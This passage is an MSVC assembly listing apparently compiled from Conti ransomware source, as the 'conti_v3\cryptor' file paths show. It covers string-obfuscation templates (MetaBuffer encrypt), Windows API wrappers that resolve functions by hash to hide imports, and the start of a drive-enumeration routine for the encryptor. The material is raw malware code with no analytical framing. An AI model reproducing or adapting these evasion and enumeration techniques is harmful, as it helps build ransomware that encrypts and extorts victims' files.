  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00589	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0058e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00595	88 41 21	 mov	 BYTE PTR [rcx+33], al
  00598	b8 01 00 00 00	 mov	 eax, 1
  0059d	48 6b c0 21	 imul	 rax, rax, 33		; 00000021H
  005a1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005a8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005b3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  005b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005bf	88 41 22	 mov	 BYTE PTR [rcx+34], al
  005c2	b8 01 00 00 00	 mov	 eax, 1
  005c7	48 6b c0 22	 imul	 rax, rax, 34		; 00000022H
  005cb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005d2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  005d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005dd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  005e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  005e9	88 41 23	 mov	 BYTE PTR [rcx+35], al
  005ec	b8 01 00 00 00	 mov	 eax, 1
  005f1	48 6b c0 23	 imul	 rax, rax, 35		; 00000023H
  005f5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  005fc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00600	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00607	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0060c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00613	88 41 24	 mov	 BYTE PTR [rcx+36], al
  00616	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0061d	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00621	88 85 c0 00 00
	00		 mov	 BYTE PTR tv350[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00627	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0062e	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00635	5f		 pop	 rdi
  00636	5d		 pop	 rbp
  00637	c3		 ret	 0
??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetLogicalDriveStringsW@@YAKKPEA_W@Z
_TEXT	SEGMENT
pFunction$ = 8
nBufferLength$ = 256
lpBuffer$ = 264
?pGetLogicalDriveStringsW@@YAKKPEA_W@Z PROC		; pGetLogicalDriveStringsW, COMDAT

; 68   : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 69   : 	DWORD(WINAPI * pFunction)(DWORD, LPWSTR);
; 70   : 	pFunction = (DWORD(WINAPI*)(DWORD, LPWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe6371b26, 107);//GetProcAddress(hKernel32, OBFA("GetLogicalDriveStringsW"));

  00023	41 b9 6b 00 00
	00		 mov	 r9d, 107		; 0000006bH
  00029	41 b8 26 1b 37
	e6		 mov	 r8d, -432596186		; e6371b26H
  0002f	ba 0f 00 00 00	 mov	 edx, 15
  00034	33 c9		 xor	 ecx, ecx
  00036	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003b	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 71   : 	return pFunction(nBufferLength, lpBuffer);

  0003f	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpBuffer$[rbp]
  00046	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR nBufferLength$[rbp]
  0004c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 72   : }

  0004f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00056	5f		 pop	 rdi
  00057	5d		 pop	 rbp
  00058	c3		 ret	 0
?pGetLogicalDriveStringsW@@YAKKPEA_W@Z ENDP		; pGetLogicalDriveStringsW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrlenW@@YAHPEB_W@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString$ = 256
?plstrlenW@@YAHPEB_W@Z PROC				; plstrlenW, COMDAT

; 58   : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 59   : 	INT(WINAPI * pFunction)(LPCWSTR);
; 60   : 	pFunction = (INT(WINAPI*)(LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe27a325f, 108);//GetProcAddress(hKernel32, OBFA("lstrlenW"));

  0001f	41 b9 6c 00 00
	00		 mov	 r9d, 108		; 0000006cH
  00025	41 b8 5f 32 7a
	e2		 mov	 r8d, -495308193		; e27a325fH
  0002b	ba 0f 00 00 00	 mov	 edx, 15
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 61   : 	return pFunction(lpString);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 62   : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?plstrlenW@@YAHPEB_W@Z ENDP				; plstrlenW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\disks.cpp
;	COMDAT ?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z
_TEXT	SEGMENT
Length$ = 4
DrivesCount$ = 36
DriveType$ = 68
BufferLength$ = 104
Buffer$ = 136
tempBuffer$ = 168
DriveInfo$1 = 200
DriveInfo$ = 232
$T2 = 456
$T3 = 488
$T4 = 548
tv158 = 568
tv91 = 568
DriveList$ = 608
?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z PROC ; filesystem::EnumirateDrives, COMDAT

; 8    : {

$LN19:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 68 02
	00 00		 sub	 rsp, 616		; 00000268H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__80D02333_disks@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 9    : 	INT Length = 0;

  0001f	c7 45 04 00 00
	00 00		 mov	 DWORD PTR Length$[rbp], 0

; 10   : 	INT DrivesCount = 0;

  00026	c7 45 24 00 00
	00 00		 mov	 DWORD PTR DrivesCount$[rbp], 0

; 11   : 	DWORD DriveType = 0;

  0002d	c7 45 44 00 00
	00 00		 mov	 DWORD PTR DriveType$[rbp], 0
$LN4@EnumirateD:

; 12   : 	TAILQ_INIT(DriveList);

  00034	48 8b 85 60 02
	00 00		 mov	 rax, QWORD PTR DriveList$[rbp]
  0003b	48 c7 00 00 00
	00 00		 mov	 QWORD PTR [rax], 0
  00042	48 8b 85 60 02
	00 00		 mov	 rax, QWORD PTR DriveList$[rbp]
  00049	48 8b 8d 60 02
	00 00		 mov	 rcx, QWORD PTR DriveList$[rbp]
  00050	48 89 41 08	 mov	 QWORD PTR [rcx+8], rax
  00054	33 c0		 xor	 eax, eax
  00056	85 c0		 test	 eax, eax
  00058	75 da		 jne	 SHORT $LN4@EnumirateD

; 13   : 
; 14   : 	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(0, NULL);

  0005a	33 d2		 xor	 edx, edx
  0005c	33 c9		 xor	 ecx, ecx
  0005e	e8 00 00 00 00	 call	 ?pGetLogicalDriveStringsW@@YAKKPEA_W@Z ; pGetLogicalDriveStringsW
  00063	8b c0		 mov	 eax, eax
  00065	48 89 45 68	 mov	 QWORD PTR BufferLength$[rbp], rax

; 15   : 	if (!BufferLength) {

  00069	48 83 7d 68 00	 cmp	 QWORD PTR BufferLength$[rbp], 0
  0006e	75 07		 jne	 SHORT $LN13@EnumirateD

; 16   : 		return 0;

  00070	33 c0		 xor	 eax, eax
  00072	e9 0b 02 00 00	 jmp	 $LN1@EnumirateD
$LN13@EnumirateD:

; 17   : 	}
; 18   : 
; 19   : 	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + 1) * sizeof(WCHAR));

  00077	48 8b 45 68	 mov	 rax, QWORD PTR BufferLength$[rbp]
  0007b	48 8d 44 00 02	 lea	 rax, QWORD PTR [rax+rax+2]
  00080	48 8b c8	 mov	 rcx, rax
  00083	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
